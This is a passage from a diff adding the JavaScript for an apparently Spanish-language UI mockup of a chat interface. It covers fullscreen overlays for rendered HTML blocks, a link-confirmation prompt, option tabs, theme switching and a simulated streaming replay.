+    ctl.append(out, pct, inn); foot.appendChild(ctl);
+    dlg.append(panel, foot);
+    overlay.append(close, dlg);
+    overlay.addEventListener('click', (e) => { if (e.target === overlay) closeOverlay(); });
+    document.body.appendChild(overlay);
+    close.focus();
+  } else {
+    overlay = el('div', 'fsw'); overlay.setAttribute('role', 'dialog'); overlay.setAttribute('aria-modal', 'true'); overlay.setAttribute('aria-label', title + ', pantalla completa');
+    const bar = el('div', 'fsw-bar', '<span class="fsw-title"></span><span class="sp"></span>');
+    bar.firstChild.textContent = title;
+    const body = el('div', 'fsw-body');
+    let view = 'page';
+    const toggle = iconButton('code', 'Ver el código', () => { view = view === 'page' ? 'code' : 'page'; paint(); });
+    function paint() {
+      body.textContent = '';
+      if (view === 'page') body.appendChild(makeFrame(block, { fill: true }));
+      else { const box = codeBox(block, { toggle: false }); body.appendChild(box); }
+      toggle.innerHTML = icon(view === 'page' ? 'code' : 'page');
+      toggle.title = view === 'page' ? 'Ver el código' : 'Ver la página';
+    }
+    const exit = iconButton('contract', 'Salir de pantalla completa', closeOverlay);
+    bar.append(toggle, copyButton(block, 'hbtn'), exit);
+    overlay.append(bar, body);
+    paint();
+    document.body.appendChild(overlay);
+    exit.focus();
+  }
+}
+document.addEventListener('keydown', (e) => { if (e.key === 'Escape') closeOverlay(); });
+
+let linkAsk = null;
+function askLink(url) {
+  linkAsk?.remove();
+  linkAsk = el('div', 'linkask', '<span class="t">¿Abrir este enlace en el navegador?<span class="u"></span></span>');
+  linkAsk.querySelector('.u').textContent = url;
+  const no = el('button', '', 'Cancelar'); no.type = 'button'; no.onclick = () => { linkAsk.remove(); linkAsk = null; };
+  const go = el('button', 'go', 'Abrir'); go.type = 'button'; go.onclick = () => { linkAsk.remove(); linkAsk = null; };
+  linkAsk.append(no, go);
+  document.body.appendChild(linkAsk);
+  go.focus();
+}
+
+/* ─────────────────────────── mock chrome ─────────────────────────── */
+function renderChrome() {
+  const tabs = document.getElementById('tabs'); tabs.textContent = '';
+  for (const g of GROUPS) {
+    const grp = el('div', 'mk-group', '<span class="mk-glabel"></span>');
+    grp.firstChild.textContent = g.label;
+    const seg = el('span', 'mk-seg'); seg.setAttribute('role', 'tablist'); seg.setAttribute('aria-label', g.label);
+    for (const o of g.opts) {
+      const b = el('button', '', (o.rec ? '<span class="rec" title="Recomendado"></span>' : '') + esc(o.t));
+      b.type = 'button'; b.setAttribute('role', 'tab'); b.setAttribute('aria-selected', String(STATE[g.key] === o.v));
+      b.onclick = () => { STATE[g.key] = o.v; userView.clear(); opened.clear(); syncURL(); render(); if (g.key === 'expand') openOverlay(blockById('dash')); };
+      seg.appendChild(b);
+    }
+    grp.appendChild(seg); tabs.appendChild(grp);
+  }
+  const notes = document.getElementById('notes'); notes.textContent = '';
+  for (const g of GROUPS) {
+    const o = g.opts.find((x) => x.v === STATE[g.key]);
+    const n = el('div', 'mk-note', '<b></b><p></p><span class="ref"></span>');
+    n.children[0].textContent = g.label + ' · ' + o.t + (o.rec ? ' (recomendado)' : '');
+    n.children[1].textContent = o.note;
+    n.children[2].textContent = o.ref;
+    notes.appendChild(n);
+  }
+  for (const b of document.querySelectorAll('[data-theme-set]')) b.setAttribute('aria-selected', String(b.dataset.themeSet === STATE.theme));
+}
+function blockById(id) { for (const t of THREAD) for (const p of t.parts || []) if (p.id === id) return p; return null; }
+function syncURL() {
+  const p = new URLSearchParams({ theme: STATE.theme });
+  for (const g of GROUPS) if (STATE[g.key] !== RECOMMENDED[g.key]) p.set(g.key, STATE[g.key]);
+  try { history.replaceState(null, '', '?' + p.toString()); } catch (e) {}
+}
+function applyTheme(theme) {
+  STATE.theme = theme;
+  document.documentElement.dataset.theme = theme;
+  const vars = themeVars();
+  for (const f of document.querySelectorAll('iframe.hb-frame')) {
+    f.style.colorScheme = theme;
+    f.contentWindow?.postMessage({ type: 'wa-html:theme', scheme: theme, vars }, '*');
+  }
+  syncURL(); renderChrome();
+}
+for (const b of document.querySelectorAll('[data-theme-set]')) b.onclick = () => applyTheme(b.dataset.themeSet);
+document.getElementById('recommended').onclick = () => { Object.assign(STATE, RECOMMENDED); userView.clear(); opened.clear(); syncURL(); render(); };
+
+let timer = null;
+document.getElementById('replay').onclick = () => {
+  clearInterval(timer);
+  streamDone = false; STATE.progress = 0.04; renderTurnOf('cov');
+  let lastLive = 0;
+  timer = setInterval(() => {
+    STATE.progress = Math.min(1, STATE.progress + 0.03);
+    if (STATE.progress >= 1) { clearInterval(timer); streamDone = true; renderTurnOf('cov'); return; }
+    if (STATE.stream === 'live') {
+      const now = Date.now(); if (now - lastLive < 350) return; lastLive = now;
+    }
+    renderTurnOf('cov');
+  }, 120);
+};
+
+document.documentElement.dataset.theme = STATE.theme;
+render();
+if (STATE.open) openOverlay(blockById('dash'));
+</script>
+</body>
+</html>
